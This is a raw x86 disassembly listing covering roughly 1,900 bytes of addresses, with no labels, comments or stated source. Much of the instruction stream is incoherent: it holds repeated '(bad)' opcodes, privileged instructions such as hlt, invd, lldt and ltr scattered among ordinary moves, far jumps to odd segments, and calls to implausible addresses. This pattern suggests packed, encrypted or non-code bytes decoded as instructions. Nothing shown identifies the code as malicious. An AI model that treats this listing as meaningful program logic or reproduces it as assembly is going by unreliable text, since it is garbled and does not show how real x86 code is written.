  42b095:	add    ah,bl
  42b097:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  42b09d:	add    BYTE PTR [ebx+0x3],dl
  42b0a0:	mov    esi,0x708088b
  42b0a5:	cmp    esi,eax
  42b0a7:	setle  BYTE PTR [ecx-0x74fcffce]
  42b0ae:	mov    esp,edi
  42b0b0:	call   0x33cdf602
  42b0b5:	or     BYTE PTR [ebx],al
  42b0b7:	inc    ecx
  42b0b8:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  42b0be:	and    BYTE PTR [ebp-0x7074f0bb],al
  42b0c4:	lock add cl,al
  42b0c7:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  42b0ce:	mov    ch,0x45
  42b0d0:	clc    
  42b0d1:	xor    eax,DWORD PTR [ebp+0x3]
  42b0d4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  42b0da:	inc    ebp
  42b0db:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  42b0e1:	mov    edi,eax
  42b0e3:	mov    eax,DWORD PTR [ebp+0x3c]
  42b0e6:	mov    ecx,DWORD PTR [eax]
  42b0e8:	hlt    
  42b0e9:	inc    ebp
  42b0ea:	ror    DWORD PTR [ebx+0x818c45],0xf4
  42b0f1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  42b0f7:	push   ebp
  42b0f8:	mov    edi,DWORD PTR [ebx]
  42b0fa:	in     al,dx
  42b0fb:	jne    0x42b0be
  42b0fd:	mov    eax,DWORD PTR [ebp-0x28]
  42b100:	add    DWORD PTR [eax],0xe8058dec
  42b106:	clc    
  42b107:	mov    eax,DWORD PTR [edi]
  42b109:	clc    
  42b10a:	add    dh,dl
  42b10c:	rol    WORD PTR [ebp-0x1],cl
  42b110:	mov    edx,DWORD PTR [eax+0x8]
  42b113:	jne    0x42b0d5
  42b115:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  42b11c:	inc    ebp
  42b11d:	push   esp
  42b11e:	test   DWORD PTR [ecx+0xf],ecx
  42b121:	sub    edx,esp
  42b123:	add    eax,DWORD PTR [eax]
  42b125:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  42b12b:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  42b132:	mov    eax,DWORD PTR [ecx]
  42b134:	and    BYTE PTR [eax],al
  42b136:	inc    edx
  42b137:	adc    BYTE PTR [eax],al
  42b139:	inc    ebp
  42b13a:	inc    cx
  42b13d:	push   esp
  42b13e:	or     BYTE PTR [ebp+0x0],dh
  42b141:	push   edx
  42b142:	enterw 0xc1,0x4d
  42b147:	mov    esp,DWORD PTR [esi+0x20]
  42b14a:	add    DWORD PTR [ecx-0x7b],eax
  42b14d:	add    eax,DWORD PTR [ebx]
  42b14f:	str    WORD PTR [eax+0x45]
  42b153:	lea    ecx,[ebx+0x45890801]
  42b159:	sbb    BYTE PTR [ebx],al
  42b15b:	dec    ebp
  42b15c:	cmp    al,0xf
  42b15e:	inc    ebp
  42b15f:	push   eax
  42b160:	mov    esi,DWORD PTR [ebx]
  42b162:	push   eax
  42b163:	add    eax,eax
  42b165:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  42b16c:	inc    ebp
  42b16d:	add    BYTE PTR ds:0x8b4d8c00,dh
  42b173:	xor    edx,esp
  42b175:	add    eax,esi
  42b177:	mov    ebx,eax
  42b179:	loopne 0x42b1c0
  42b17b:	dec    ebp
  42b17c:	mov    ecx,DWORD PTR [edi]
  42b17e:	cld    
  42b17f:	push   eax
  42b180:	xchg   DWORD PTR [ebx],esi
  42b182:	add    DWORD PTR [ebx],ebp
  42b184:	add    BYTE PTR [ebx],ch
  42b186:	or     BYTE PTR [ecx],bh
  42b188:	dec    ecx
  42b189:	loopne 0x42b18e
  42b18b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  42b191:	push   ebp
  42b192:	add    DWORD PTR [ebx+0x55100800],eax
  42b198:	dec    ebp
  42b199:	jmp    0x42b124
  42b19b:	mov    esp,DWORD PTR [eax]
  42b19d:	sbb    dl,dl
  42b19f:	inc    eax
  42b1a0:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  42b1a6:	add    BYTE PTR [ebx+0x74528555],cl
  42b1ac:	push   ebp
  42b1ad:	div    DWORD PTR [ebx]
  42b1af:	and    eax,DWORD PTR [ebx]
  42b1b1:	add    edx,DWORD PTR [edx-0x30]
  42b1b4:	jno    0x42b141
  42b1b6:	inc    DWORD PTR [eax+eiz*1]
  42b1b9:	inc    ebp
  42b1ba:	push   eax
  42b1bb:	push   eax
  42b1bc:	mov    esp,DWORD PTR [edi-0x74beff1c]
  42b1c2:	mov    edi,esp
  42b1c4:	push   eax
  42b1c5:	inc    ebp
  42b1c6:	enter  0x458b,0x8
  42b1ca:	push   ecx
  42b1cb:	(bad)  
  42b1cc:	call   0x10cbba4
  42b1d1:	pop    ss
  42b1d2:	push   ebp
  42b1d3:	mov    ecx,DWORD PTR [ebx+0x489408]
  42b1d9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  42b1df:	push   ecx
  42b1e0:	jo     0x42b1ca
  42b1e2:	inc    DWORD PTR [edi]
  42b1e4:	or     BYTE PTR [eax],al
  42b1e6:	call   0xcdb930
  42b1eb:	fmul   QWORD PTR [ebp+0x55]
  42b1ee:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  42b1f4:	mov    bh,0x8c
  42b1f6:	adc    al,0x9e
  42b1f8:	dec    esp
  42b1f9:	xor    bl,BYTE PTR [eax]
  42b1fb:	mov    ecx,DWORD PTR [ebp+0xc]
  42b1fe:	mov    eax,DWORD PTR [ebp-0x4]
  42b201:	mov    esi,DWORD PTR [edi-0x3148f924]
  42b207:	push   es
  42b208:	retf   
  42b209:	mov    BYTE PTR [ebp-0x30],0x3b
  42b20d:	inc    ebp
  42b20e:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  42b215:	retf   0x83fc
  42b218:	into   
  42b219:	dec    ebp
  42b21a:	retf   
  42b21b:	mov    ecx,DWORD PTR [ebp-0x74]
  42b21e:	mov    eax,DWORD PTR [eax]
  42b220:	fdiv   QWORD PTR [ebx]
  42b222:	mov    bh,0x3
  42b224:	push   es
  42b225:	mov    esi,ecx
  42b227:	sbb    cl,dl
  42b229:	dec    ebp
  42b22a:	sar    DWORD PTR [ebx],cl
  42b22c:	push   ebp
  42b22d:	jne    0x42b23e
  42b22f:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  42b235:	lea    ebx,[eax]
  42b237:	call   0xf4cc3dfe
  42b23c:	sbb    dh,dl
  42b23e:	add    edx,ebx
  42b240:	push   ebp
  42b241:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42b247:	push   ecx
  42b248:	mov    DWORD PTR [eax-0x30],edx
  42b24b:	test   DWORD PTR [edx],eax
  42b24d:	xadd   esp,esi
  42b250:	pop    es
  42b251:	add    cl,dl
  42b253:	mov    eax,ecx
  42b255:	or     al,0x45
  42b257:	(bad)  
  42b258:	push   eax
  42b259:	add    DWORD PTR [edx+0x0],eax
  42b25c:	add    ecx,DWORD PTR [ecx]
  42b25e:	and    dh,cl
  42b260:	call   0xc6bb30
  42b265:	add    DWORD PTR [ebp+0x0],edx
  42b268:	mov    esp,DWORD PTR [ebp+0x18]
  42b26b:	add    BYTE PTR [eax+0x24],cl
  42b26e:	xor    eax,DWORD PTR [eax]
  42b270:	add    esp,DWORD PTR [esi+0x3b]
  42b273:	inc    ebp
  42b274:	je     0x42b1f9
  42b276:	push   ecx
  42b277:	or     cl,BYTE PTR [ebp-0x77]
  42b27a:	add    eax,esi
  42b27c:	or     al,0x1e
  42b27e:	inc    eax
  42b27f:	add    BYTE PTR [ebx],al
  42b281:	data16 and BYTE PTR [ebp+0x50],al
  42b285:	sub    DWORD PTR [ecx],0x8
  42b288:	add    BYTE PTR [ebp-0x75],ah
  42b28b:	add    BYTE PTR [eax],bl
  42b28d:	enter  0x894d,0x8b
  42b291:	int3   
  42b292:	loopne 0x42b24e
  42b294:	rol    BYTE PTR [eax],0x33
  42b297:	lea    cx,[ebp+0xa]
  42b29b:	data16 jb 0x42b2e3
  42b29e:	add    BYTE PTR [ebx+0x44890855],cl
  42b2a4:	sbb    ah,al
  42b2a6:	inc    ebp
  42b2a7:	inc    edx
  42b2a8:	lldt   WORD PTR [edx+0x66]
  42b2ac:	xor    ecx,DWORD PTR [eax]
  42b2ae:	sub    ecx,DWORD PTR [eax]
  42b2b0:	mov    eax,DWORD PTR [eax]
  42b2b2:	or     al,0x66
  42b2b4:	ror    edx,cl
  42b2b6:	dec    ebp
  42b2b7:	inc    ebp
  42b2b8:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  42b2be:	cld    
  42b2bf:	or     BYTE PTR [edi+0x4501dd],dl
  42b2c5:	enter  0xeece,0xcb
  42b2c9:	(bad)  
  42b2ca:	dec    ebp
  42b2cb:	mov    al,0x8b
  42b2cd:	jmp    0xea27:0x450a3320
  42b2d4:	xchg   esi,ebp
  42b2d6:	add    edi,eax
  42b2d8:	add    BYTE PTR [eax+0x3f52ed55],bh
  42b2de:	push   ebp
  42b2df:	inc    ebp
  42b2e0:	xor    edx,eax
  42b2e2:	add    ebp,esi
  42b2e4:	push   edx
  42b2e5:	push   bp
  42b2e7:	inc    ebp
  42b2e8:	jmp    ecx
  42b2ea:	push   esp
  42b2eb:	(bad)  
  42b2ec:	inc    edx
  42b2ee:	sbb    al,0x33
  42b2f0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  42b2f7:	add    BYTE PTR [ebp+0x49],0x8b
  42b2fb:	jmp    0xf98b:0x100041c8
  42b302:	xor    esi,DWORD PTR [edx+0x3]
  42b305:	mov    ecx,DWORD PTR [edi]
  42b307:	fmul   DWORD PTR [edx]
  42b309:	add    BYTE PTR [eax],al
  42b30b:	lea    eax,[ebx-0x4700273c]
  42b311:	add    al,0x4f
  42b313:	pop    DWORD PTR [eax]
  42b315:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  42b31b:	push   edx
  42b31c:	inc    WORD PTR [ebp+0x8]
  42b320:	mov    eax,0x514f4d
  42b325:	(bad)
  42b329:	add    al,al
  42b32b:	xor    DWORD PTR [ebx-0x74baf730],eax
  42b331:	test   DWORD PTR [esi+0x74],esp
  42b334:	inc    ebp
  42b335:	mov    DWORD PTR [eax+0xa4e08],edi
  42b33b:	add    BYTE PTR [ecx-0x76c435bb],cl
  42b341:	or     dh,cl
  42b343:	or     eax,0x8b8d5045
  42b348:	inc    ebp
  42b349:	mov    WORD PTR [ecx+0x3b8a00],?
  42b34f:	jne    0x42b384
  42b351:	mov    edi,DWORD PTR [edx+0x8f3b18]
  42b357:	add    DWORD PTR [ebx],eax
  42b359:	add    bh,bh
  42b35b:	adc    DWORD PTR [eax],ecx
  42b35d:	adc    DWORD PTR [ebp+0x55],edi
  42b360:	push   es
  42b361:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42b367:	mov    ebp,DWORD PTR [eax+ebp*1+0x503211d0]
  42b36e:	inc    ebp
  42b36f:	mov    edx,edi
  42b371:	or     al,0xd0
  42b373:	push   eax
  42b374:	(bad)  
  42b375:	jne    0x42b32b
  42b377:	call   0x2aac5c
  42b37c:	inc    ebp
  42b37d:	shl    BYTE PTR [edx],0x84
  42b380:	out    dx,al
  42b381:	add    bh,al
  42b383:	add    BYTE PTR [ebp+esi*2-0x2c7430],bh
  42b38a:	(bad)  
  42b38b:	and    al,al
  42b38d:	fs loope 0x42b38f
  42b390:	inc    ebp
  42b391:	test   DWORD PTR [edi+ecx*1-0x37],edi
  42b395:	scas   al,BYTE PTR es:[edi]
  42b396:	inc    esp
  42b397:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  42b39e:	or     BYTE PTR [ebx-0x97717cb],0x83
  42b3a5:	call   DWORD PTR [edi]
  42b3a7:	shr    ah,0x84
  42b3aa:	xchg   DWORD PTR [eax],eax
  42b3ac:	add    DWORD PTR [eax],eax
  42b3ae:	add    bh,bh
  42b3b0:	dec    ebp
  42b3b1:	and    BYTE PTR [ecx-0x38],dl
  42b3b4:	push   eax
  42b3b5:	dec    DWORD PTR [ebx+0xfd885]
  42b3bb:	mov    BYTE PTR [ebp+0x508bac00],cl
  42b3c1:	mov    WORD PTR [ecx+0x0],ss
  42b3c4:	lea    ecx,[ebx+0x108b20d8]
  42b3ca:	mov    WORD PTR [edx],ds
  42b3cc:	add    BYTE PTR [edi+0xff01ff],al
  42b3d2:	mov    ecx,DWORD PTR [ebp-0x28]
  42b3d5:	push   ecx
  42b3d6:	shl    BYTE PTR [ebp+0x3a],0x8b
  42b3da:	inc    ebp
  42b3db:	in     al,0xeb
  42b3dd:	jno    0x42b36a
  42b3df:	push   edx
  42b3e0:	mov    DWORD PTR [eax-0x28],edx
  42b3e3:	mov    eax,DWORD PTR [ebp+0x20]
  42b3e6:	je     0x42b36f
  42b3e8:	mov    eax,DWORD PTR [ecx]
  42b3ea:	sbb    BYTE PTR [eax],al
  42b3ec:	pop    DWORD PTR [eax]
  42b3ee:	add    esi,eax
  42b3f0:	add    bl,al
  42b3f2:	adc    DWORD PTR [edi],esi
  42b3f4:	jmp    0x8bce0446
  42b3f9:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  42b400:	jne    0x42b38d
  42b402:	mov    ecx,DWORD PTR [eax]
  42b404:	in     al,0x75
  42b406:	pop    DWORD PTR [ecx+0x5701]
  42b40c:	push   edx
  42b40d:	inc    DWORD PTR [ebx]
  42b40f:	adc    BYTE PTR [ecx+0x45721cc6],cl
  42b415:	add    BYTE PTR [edi+0x9],dl
  42b418:	call   DWORD PTR [esi]
  42b41a:	and    dl,al
  42b41c:	and    bh,bh
  42b41e:	inc    edi
  42b420:	test   eax,edx
  42b422:	sldt   ebx
  42b425:	xor    al,0x0
  42b427:	pushf  
  42b428:	(bad)  
  42b429:	jmp    0x42b437
  42b42b:	mov    eax,edi
  42b42d:	or     al,0x75
  42b42f:	inc    eax
  42b430:	call   0x42ab38
  42b435:	mov    eax,eax
  42b437:	loopne 0x42b3bd
  42b439:	inc    ebp
  42b43a:	add    BYTE PTR [ebx+0x1451c00],cl
  42b440:	mov    eax,DWORD PTR [ebp+0x20]
  42b443:	add    edi,ecx
  42b445:	add    BYTE PTR [eax],ch
  42b447:	cmp    edi,0x18
  42b44a:	test   DWORD PTR [ebp+0xf],esi
  42b44d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42b454:	jne    0x42b458
  42b456:	call   0xffa1af1b
  42b45b:	leave  
  42b45c:	rcr    BYTE PTR [esp+eax*4],0x55
  42b460:	add    ah,ch
  42b462:	add    BYTE PTR [edi-0x48fef979],dh
  42b468:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  42b46f:	inc    esp
  42b470:	mov    ebx,DWORD PTR [eax]
  42b472:	fcom   st(2)
  42b474:	add    BYTE PTR [edi],bl
  42b476:	lea    ecx,[eax-0x18]
  42b479:	(bad)  
  42b47a:	push   DWORD PTR [ecx]
  42b47c:	call   0xffb501de
  42b481:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  42b485:	fstp   DWORD PTR [esi+ebx*8]
  42b488:	push   ebp
  42b489:	pop    ebp
  42b48a:	mov    esi,DWORD PTR [edx-0x38]
  42b48d:	add    DWORD PTR [eax],0x28
  42b490:	mov    edi,DWORD PTR [ebx]
  42b492:	xor    esi,DWORD PTR [edx+0x3]
  42b495:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  42b499:	pop    ebp
  42b49a:	or     al,0x4
  42b49c:	inc    ecx
  42b49d:	push   ebp
  42b49e:	(bad)  
  42b49f:	in     al,dx
  42b4a0:	or     ah,ch
  42b4a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b4a3:	xbegin 0xffc82a99
  42b4a9:	clc    
  42b4aa:	adc    al,0x45
  42b4ac:	div    BYTE PTR [eax+ecx*1]
  42b4af:	pushf  
  42b4b0:	add    bh,al
  42b4b2:	jne    0x42b48c
  42b4b4:	add    DWORD PTR [ebp+0x1b00f89e],0x66710066
  42b4be:	add    eax,DWORD PTR [ebp+0x52]
  42b4c1:	adc    eax,0x60
  42b4c4:	xchg   DWORD PTR [ecx+0x3000fc01],ecx
  42b4ca:	test   DWORD PTR [eax],eax
  42b4cc:	clc    
  42b4cd:	data16 or al,BYTE PTR [ebp+0x45]
  42b4d1:	or     DWORD PTR [ebx-0x3d76d720],0xfffffff8
  42b4d8:	rol    BYTE PTR [ebp+0x45],1
  42b4db:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  42b4e1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  42b4e7:	push   ebx
  42b4e8:	add    BYTE PTR [edi+0x0],dl
  42b4eb:	push   ecx
  42b4ec:	jge    0x42b521
  42b4ee:	add    BYTE PTR [esi+0x4],dl
  42b4f1:	jne    0x42b558
  42b4f3:	mov    edx,0x457200
  42b4f8:	jmp    0x42b4bc
  42b4fa:	xor    edi,DWORD PTR [ebx]
  42b4fc:	pop    edi
  42b4fd:	cvtdq2ps xmm7,xmm0
  42b500:	ret    0x0
  42b503:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  42b509:	xor    ecx,DWORD PTR [edi]
  42b50b:	add    eax,DWORD PTR [ecx+0x3b]
  42b50e:	push   ebx
  42b50f:	rdpmc  
  42b511:	out    0x8d,al
  42b513:	add    BYTE PTR [eax],cl
  42b515:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  42b51b:	ret    0x450c
  42b51e:	sbb    al,0x8b
  42b520:	cmp    eax,esi
  42b522:	or     cl,al
  42b524:	or     al,0xc2
  42b526:	pop    eax
  42b527:	inc    ebp
  42b528:	add    ecx,DWORD PTR [edi]
  42b52a:	add    esi,DWORD PTR [ebp+0x39]
  42b52d:	invd   
  42b52f:	jge    0x42b53b
  42b531:	mov    eax,0x478ac0
  42b536:	cli    
  42b537:	xor    esp,ecx
  42b539:	mov    ebx,0x5b8ac0
  42b53e:	ret    0x33
  42b541:	mov    eax,0x833b8b
  42b546:	sub    BYTE PTR [ebx],al
  42b548:	inc    ebp
  42b549:	xor    ax,0x9cf8
  42b54d:	inc    bh
  42b54f:	mov    esp,esp
  42b551:	hlt    
  42b552:	test   DWORD PTR [ebp-0x8],esi
  42b555:	mov    eax,DWORD PTR [ebp-0x14]
  42b558:	xor    ecx,DWORD PTR [ebx-0x76478864]
  42b55e:	dec    edi
  42b55f:	or     BYTE PTR [eax],al
  42b561:	jne    0x42b4ec
  42b563:	mov    esi,esp
  42b565:	call   0x77a9412a
  42b56a:	inc    ebp
  42b56b:	mov    DWORD PTR [eax+0x9e4f0c],edi
  42b571:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42b577:	add    BYTE PTR [esi+0x7d],ah
  42b57a:	inc    ebp
  42b57b:	mov    bx,WORD PTR [ebp+0x8]
  42b57f:	add    DWORD PTR [ebp+0x57],0x30c008b
  42b586:	inc    ebp
  42b587:	mov    bx,di
  42b58a:	lock test BYTE PTR [ecx+0x7000801],bh
  42b591:	jge    0x42b554
  42b593:	mov    ecx,DWORD PTR [ebx-0x610613f0]
  42b599:	cli    
  42b59a:	xor    bl,bh
  42b59c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  42b5a2:	test   BYTE PTR [eax],cl
  42b5a4:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  42b5ab:	cmp    ebp,eax
  42b5ad:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  42b5b4:	test   BYTE PTR [ebp+0x1],bh
  42b5b7:	mov    ebx,0x458a00
  42b5bc:	xor    esi,DWORD PTR [ebx]
  42b5be:	add    esp,DWORD PTR [esi-0x77]
  42b5c1:	pop    ebp
  42b5c2:	loopne 0x42b62a
  42b5c4:	inc    ebp
  42b5c5:	clc    
  42b5c6:	xor    edi,DWORD PTR [ebx]
  42b5c8:	add    esi,DWORD PTR [edx-0x77]
  42b5cb:	data16 fdivr QWORD PTR [ebp-0x49]
  42b5cf:	mov    ebx,0xb78afc
  42b5d4:	hlt    
  42b5d5:	xor    eax,DWORD PTR [edx+0x66]
  42b5d8:	add    BYTE PTR [ebp+0x66],bl
  42b5db:	data16 lock clc 
  42b5de:	inc    edx
  42b5df:	cmp    eax,DWORD PTR [eax]
  42b5e1:	ja     0x42b649
  42b5e3:	psubq  mm7,QWORD PTR [ebp+0x8]
  42b5e7:	ltr    WORD PTR [ebp+0x66]
  42b5eb:	add    esi,eax
  42b5ed:	add    di,WORD PTR [ebp+0x2b]
  42b5f1:	data16 data16 jge 0x42b672
  42b5f5:	mov    ebx,0xe08a8b
  42b5fa:	jge    0x42b62f
  42b5fc:	data16 data16 xor al,0x5d
  42b600:	data16 data16 jne 0x42b5fc
  42b604:	mov    edi,DWORD PTR [ebx]
  42b606:	fdiv   QWORD PTR [edx+0x7d]
  42b609:	data16 data16 jge 0x42b641
  42b60d:	mov    ebx,0x758a66
  42b612:	mov    esi,0x667233
  42b617:	pop    ebp
  42b618:	or     BYTE PTR [esi+0x0],ah
  42b61b:	clc    
  42b61c:	mov    edi,DWORD PTR [ebx]
  42b61e:	lock ja 0x42b5ac
  42b621:	(bad)  
  42b623:	jge    0x42b61c
  42b625:	invd   
  42b627:	pop    ebp
  42b628:	add    BYTE PTR [ebx],al
  42b62a:	(bad)  
  42b62b:	cmp    di,WORD PTR [ebp+0xf]
  42b62f:	data16 sbb bh,BYTE PTR [ebp+0x0]
  42b633:	mov    bx,WORD PTR [ebp-0x10]
  42b637:	pop    bp
  42b639:	fbstp  TBYTE PTR [ebx]
  42b63b:	test   DWORD PTR [ebx],eax
  42b63d:	add    BYTE PTR [ebx],bh
  42b63f:	add    BYTE PTR [esi+0x7d],ah
  42b642:	jge    0x42b5cf
  42b644:	data16 in al,dx
  42b646:	pop    ebp
  42b647:	stc    
  42b648:	bsf    ecx,DWORD PTR [ebp+0x6632009e]
  42b64f:	mov    edi,ebx
  42b651:	in     al,dx
  42b652:	test   BYTE PTR [ebp+0x0],bh
  42b655:	mov    eax,DWORD PTR [eax]
  42b657:	call   0xbd3fafe7
  42b65c:	inc    edx
  42b65d:	sahf   
  42b65e:	add    BYTE PTR [edx],dh
  42b660:	mov    bx,di
  42b663:	call   0x8b4b33f3
  42b668:	add    ebp,esp
  42b66a:	mov    bx,di
  42b66d:	jnp    0x42b695
  42b66f:	mov    DWORD PTR [ebx+0x427df808],ecx
  42b675:	mov    eax,DWORD PTR [eax]
  42b677:	call   0x7c3e41e2
  42b67c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  42b682:	data16 data16 fistp WORD PTR [ebp+0xe]
  42b687:	xor    DWORD PTR [edi-0x48fff7a9],0xfb66f403
  42b691:	fisttp WORD PTR [ecx-0x7401f77b]
  42b697:	(bad)  
  42b698:	cld    
  42b699:	jne    0x42b6dd
  42b69b:	xor    eax,DWORD PTR [eax]
  42b69d:	mov    esp,DWORD PTR [esi-0x10]
  42b6a0:	sti    
  42b6a1:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  42b6a8:	data16 adc bl,bh
  42b6ab:	push   ebp
  42b6ac:	xor    ecx,DWORD PTR es:[ebx+0x42e4f88b]
  42b6b3:	mov    WORD PTR [eax],es
  42b6b5:	sahf   
  42b6b6:	data16 xor bh,bl
  42b6b9:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  42b6bf:	mov    esp,DWORD PTR [esi-0x14]
  42b6c2:	fisttp WORD PTR [ebx-0x3748a9f2]
  42b6c8:	or     al,0x2b
  42b6ca:	mov    bh,0xba
  42b6cc:	hlt    
  42b6cd:	mov    bh,bl
  42b6cf:	add    BYTE PTR [ecx-0x7446f3cd],cl
  42b6d5:	dec    esi
  42b6d6:	or     al,0x0
  42b6d8:	mov    edi,DWORD PTR [ebx]
  42b6da:	or     BYTE PTR [ebp+0x3b],dh
  42b6dd:	mov    ecx,DWORD PTR [edi]
  42b6df:	fdivr  QWORD PTR [ebx-0x7499ff83]
  42b6e5:	xor    al,0xd8
  42b6e7:	pop    bp
  42b6e9:	lock xor esi,DWORD PTR [ebx]
  42b6ec:	lea    esp,[esi+0x1f]
  42b6ef:	icebp  
  42b6f0:	jb     0x42b6f6
  42b6f2:	add    al,al
  42b6f4:	jge    0x42b702
  42b6f6:	mov    eax,eax
  42b6f8:	fsubr  st,st(3)
  42b6fa:	pop    ebp
  42b6fb:	mov    esi,DWORD PTR [ebx]
  42b6fd:	in     al,0x8d
  42b6ff:	rcr    DWORD PTR [edi],0xc2
  42b702:	jb     0x42b762
  42b704:	add    cl,cl
  42b706:	jge    0x42b714
  42b708:	mov    edx,DWORD PTR [ebp-0x20]
  42b70b:	in     al,dx
  42b70c:	pop    ebp
  42b70d:	data16 data16 or BYTE PTR [esi+edi*4],bh
  42b712:	cmp    di,WORD PTR [ebp+0x0]
  42b716:	mov    ebp,DWORD PTR [ebx]
  42b718:	fdivr  QWORD PTR [esi+0x668a5d]
  42b71e:	cmp    al,0x33
  42b720:	mov    si,0x4e7d
  42b724:	mov    eax,DWORD PTR [eax]
  42b726:	lock inc ebp
  42b728:	mov    esi,DWORD PTR [esi]
  42b72a:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  42b731:	clc    
  42b732:	(bad)  
  42b733:	cmp    edi,DWORD PTR [ebx]
  42b735:	je     0x42b746
  42b737:	push   ebx
  42b738:	loopne 0x42b749
  42b73a:	dec    ecx
  42b73c:	mov    esp,DWORD PTR [edx-0x1c]
  42b73f:	int    0xf1
  42b741:	mov    esi,0x703084d
  42b746:	movlhps xmm6,xmm1
  42b749:	add    BYTE PTR [ebp+0x66],dh
  42b74c:	jmp    0x42b719
  42b74e:	mov    eax,DWORD PTR [ebx]
  42b750:	lock push ebp
  42b752:	ror    DWORD PTR [ebp-0x2972feb3],1
  42b758:	or     bh,dl
  42b75a:	jb     0x42b75a
  42b75c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  42b762:	loopne 0x42b764
  42b764:	jne    0x42b76e
  42b766:	data16 add BYTE PTR [esi+eiz*2],dh
  42b76a:	mov    ecx,ebx
  42b76c:	inc    dx
  42b76e:	icebp  
  42b76f:	add    BYTE PTR [edx+0x66],al
  42b772:	add    bl,cl
  42b774:	mov    dx,0xf2
  42b778:	mov    edx,0x66cb0066
  42b77d:	enter  0x4df1,0x19
  42b781:	pop    edi
  42b782:	jne    0x42b705
  42b784:	mov    esi,DWORD PTR [esi]
  42b786:	call   0x77b74327
  42b78b:	xor    ebp,DWORD PTR [ebx]
  42b78d:	lea    esp,[esi+0x48]
  42b790:	repnz in eax,0x3b
  42b793:	add    BYTE PTR [ebp-0x37],dh
  42b796:	xor    edx,DWORD PTR [ebp-0x15]
  42b799:	in     al,dx
  42b79a:	xor    edx,DWORD PTR [esi+0x40]
  42b79d:	mov    DWORD PTR [edi],0x338545fc
  42b7a3:	clc    
  42b7a4:	add    esi,DWORD PTR ds:0xe85b9c5f
  42b7aa:	ret    0xff
  42b7ad:	dec    DWORD PTR [ebx-0x74f8ae08]
  42b7b3:	xor    eax,0x7c084956
  42b7b8:	add    BYTE PTR [ecx+0x66],ah
  42b7bb:	(bad)  
  42b7bc:	into   
  42b7bd:	bound  eax,QWORD PTR [edx-0x33]
  42b7c0:	add    BYTE PTR [ecx+0x7ce0866],bh
  42b7c6:	mov    edx,0xc7000066
  42b7cb:	or     ah,bh
  42b7cd:	add    BYTE PTR [ebp+0x35c3f866],al
  42b7d3:	inc    edx
  42b7d4:	pushf  
  42b7d5:	add    BYTE PTR [esi+0x66],ah
  42b7d8:	into   
  42b7d9:	ret    
  42b7da:	pop    ebp
  42b7db:	fs push edi
  42b7dd:	add    BYTE PTR [edi-0x723c409a],dh
  42b7e3:	add    edi,edi
  42b7e5:	jne    0x42b83e
  42b7e7:	lea    edx,[ecx+0x1]
  42b7ea:	mov    ebx,0xd64ff1
  42b7ef:	sar    DWORD PTR [ebx],1
  42b7f1:	test   BYTE PTR [ebp+0x3c],dh
  42b7f4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  42b7f8:	push   edi
  42b7f9:	xor    BYTE PTR [ebx],0x35
  42b7fc:	mov    esi,ebx
  42b7fe:	xor    eax,DWORD PTR [eax-0x3c73839a]
  42b804:	cmp    al,0x45
  42b806:	fs pop ebx
  42b808:	mov    ebx,0x9c3b36
  42b80d:	je     0x42b83a
  42b80f:	xor    edi,DWORD PTR [ebx+0x668a33]
  42b815:	mov    WORD PTR [ebx],?
  42b817:	cmp    al,0xbb
  42b819:	fs dec esi
  42b81b:	mov    eax,DWORD PTR [eax]
  42b81d:	pop    edi
  42b81e:	cmp    ecx,ecx
  42b820:	jne    0x42b877
  42b822:	mov    ebp,esp
  42b824:	cld    
  42b825:	push   esi
  42b826:	pop    ebx
  42b827:	inc    ebp
  42b828:	stc    
  42b829:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  42b831:	clc    
  42b832:	test   dl,dl
  42b834:	notrack jmp DWORD PTR [esi+eiz*2+0x5e]
  42b839:	or     bl,al
  42b83b:	or     BYTE PTR [ebx+0x57665100],cl
  42b841:	retf   0x4245
  42b844:	add    BYTE PTR ss:[esi+eiz*2-0x457a3542],bl
  42b84c:	clc    
  42b84d:	add    BYTE PTR [ebx+0x66],bl
  42b850:	dec    edx
  42b852:	mov    edx,DWORD PTR [edi-0x76]
  42b855:	push   edi
  42b856:	add    al,0xb7
  42b858:	xor    al,0xba
  42b85a:	cmp    al,0x8d
  42b85c:	je     0x42b85d
  42b85e:	mov    edx,DWORD PTR [edi-0x46]
  42b861:	push   ecx
  42b862:	lea    edi,[ebx+0x574fff]
  42b868:	push   ecx
